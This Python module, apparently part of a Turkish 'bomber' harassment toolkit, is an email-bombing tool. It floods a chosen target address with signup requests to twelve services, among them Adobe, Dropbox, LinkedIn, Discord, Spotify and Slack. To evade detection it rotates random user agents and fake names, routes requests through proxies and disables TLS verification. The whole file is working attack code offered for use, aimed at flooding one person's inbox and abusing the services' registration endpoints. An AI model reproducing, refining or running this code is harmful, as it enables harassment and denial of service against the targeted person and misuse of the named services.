# modules/email_bomber.py - V13.0 DRAGON EDITION

import requests
import time
import random
from datetime import datetime
from colorama import Fore, Style
from fake_useragent import UserAgent

class SendEmail:
    def __init__(self, target_email, proxy_manager=None, use_proxy=True):
        self.target = target_email
        self.proxy_manager = proxy_manager
        self.use_proxy = use_proxy
        self.ua = UserAgent()
        self.success_count = 0
        self.fail_count = 0
    
    def _log(self, mesaj, seviye="INFO"):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            with open('data/tang_bomber.log', 'a', encoding='utf-8') as f:
                f.write(f"[{timestamp}] [{seviye}] [EmailBomber] {mesaj}\n")
        except:
            pass
    
    def _get_headers(self):
        return {
            "User-Agent": self.ua.random,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "tr-TR,tr;q=0.9,en;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }
    
    def _get_proxy(self):
        if self.use_proxy and self.proxy_manager:
            return self.proxy_manager.get_proxy()
        return None
    
    def _random_name(self):
        names = ["Ahmet", "Mehmet", "Ali", "Veli", "Ayşe", "Fatma", "Zeynep", "Emre", "Can", "Deniz"]
        surnames = ["Yılmaz", "Demir", "Kaya", "Çelik", "Şahin", "Yıldız", "Öztürk", "Aydın"]
        return f"{random.choice(names)} {random.choice(surnames)}"
    
    def _send_request(self, url, method, data, api_name):
        """Ortak istek gönderme metodu - detaylı log"""
        try:
            headers = self._get_headers()
            if "json" in str(data).lower():
                headers["Content-Type"] = "application/json"
            else:
                headers["Content-Type"] = "application/x-www-form-urlencoded"
            
            proxy = self._get_proxy()
            start_time = time.time()
            
            if method.upper() == "POST":
                if headers.get("Content-Type") == "application/json":
                    r = requests.post(url, json=data, headers=headers, proxies=proxy, timeout=15, verify=False)
                else:
                    r = requests.post(url, data=data, headers=headers, proxies=proxy, timeout=15, verify=False)
            else:
                r = requests.get(url, params=data, headers=headers, proxies=proxy, timeout=15, verify=False)
            
            elapsed = time.time() - start_time
            
            if r.status_code in [200, 201, 202, 204, 302]:
                self._log(f"✅ {api_name} | {self.target} | {r.status_code} | {elapsed:.2f} sn", "INFO")
                self.success_count += 1
                return True
            else:
                self._log(f"❌ {api_name} | {self.target} | {r.status_code} | {elapsed:.2f} sn", "WARNING")
                self.fail_count += 1
                return False
        except Exception as e:
            self._log(f"❌ {api_name} | {self.target} | HATA: {str(e)[:50]}", "ERROR")
            self.fail_count += 1
            return False
    
    def adobe(self):
        url = "https://auth.services.adobe.com/signup/v2/users"
        data = {"email": self.target, "password": "Test123!", "firstName": self._random_name().split()[0], "lastName": self._random_name().split()[-1] if len(self._random_name().split()) > 1 else "User", "countryCode": "TR", "locale": "tr_TR", "marketingEnabled": False}
        return self._send_request(url, "POST", data, "Adobe")
    
    def canva(self):
        url = "https://api.canva.com/rest/v1/users"
        data = {"email": self.target, "password": "Test123!", "first_name": self._random_name().split()[0], "last_name": self._random_name().split()[-1] if len(self._random_name().split()) > 1 else "User"}
        return self._send_request(url, "POST", data, "Canva")
    
    def dropbox(self):
        url = "https://www.dropbox.com/register"
        data = {"email": self.target, "password": "Test123!", "first_name": self._random_name().split()[0], "last_name": self._random_name().split()[-1] if len(self._random_name().split()) > 1 else "User", "tos_accept": "true"}
        return self._send_request(url, "POST", data, "Dropbox")
    
    def linkedin(self):
        url = "https://www.linkedin.com/signup/cold-join"
        data = {"email": self.target, "password": "Test123!", "firstName": self._random_name().split()[0], "lastName": self._random_name().split()[-1] if len(self._random_name().split()) > 1 else "User"}
        return self._send_request(url, "POST", data, "LinkedIn")
    
    def pinterest(self):
        url = "https://www.pinterest.com/resource/UserRegistrationResource/create/"
        data = {"email": self.target, "password": "Test123!", "first_name": self._random_name().split()[0], "last_name": self._random_name().split()[-1] if len(self._random_name().split()) > 1 else "User"}
        return self._send_request(url, "POST", data, "Pinterest")
    
    def reddit(self):
        url = "https://www.reddit.com/api/register"
        data = {"email": self.target, "password": "Test123!", "username": f"user_{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))}"}
        return self._send_request(url, "POST", data, "Reddit")
    
    def tumblr(self):
        url = "https://www.tumblr.com/signup"
        data = {"email": self.target, "password": "Test123!", "user[email]": self.target, "user[password]": "Test123!"}
        return self._send_request(url, "POST", data, "Tumblr")
    
    def discord(self):
        url = "https://discord.com/api/v9/auth/register"
        data = {"email": self.target, "password": "Test123!", "username": f"user_{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))}"}
        return self._send_request(url, "POST", data, "Discord")
    
    def notion(self):
        url = "https://www.notion.so/api/v3/signUpUser"
        data = {"email": self.target, "password": "Test123!", "name": self._random_name()}
        return self._send_request(url, "POST", data, "Notion")
    
    def spotify(self):
        url = "https://www.spotify.com/api/signup"
        data = {"email": self.target, "password": "Test123!", "display_name": self._random_name(), "gender": random.choice(["male", "female"]), "birth_year": str(random.randint(1980, 2005)), "birth_month": str(random.randint(1, 12)), "birth_day": str(random.randint(1, 28))}
        return self._send_request(url, "POST", data, "Spotify")
    
    def telegram(self):
        url = "https://telegram.org/signup"
        data = {"email": self.target, "first_name": self._random_name().split()[0], "last_name": self._random_name().split()[-1] if len(self._random_name().split()) > 1 else "User"}
        return self._send_request(url, "POST", data, "Telegram")
    
    def slack(self):
        url = "https://slack.com/api/users.admin.invite"
        data = {"email": self.target, "set_active": "true", "_attempts": "1"}
        return self._send_request(url, "POST", data, "Slack")
    
    def run(self, target_count=10):
        methods = [self.adobe, self.canva, self.dropbox, self.linkedin, self.pinterest, self.reddit, self.tumblr, self.discord, self.notion, self.spotify, self.telegram, self.slack]
        
        self._log(f"{len(methods)} servis ile başlatılıyor, hedef: {target_count}", "INFO")
        print(f"{Fore.CYAN}[*] {len(methods)} servis ile başlatılıyor...{Style.RESET_ALL}")
        
        while self.success_count < target_count:
            random.shuffle(methods)
            for method in methods:
                if self.success_count >= target_count:
                    break
                method()
                time.sleep(random.uniform(0.5, 1.5))
        
        self._log(f"EMAIL BOMB TAMAMLANDI: {self.success_count} başarılı, {self.fail_count} başarısız", "INFO")
        return self.success_count, self.fail_count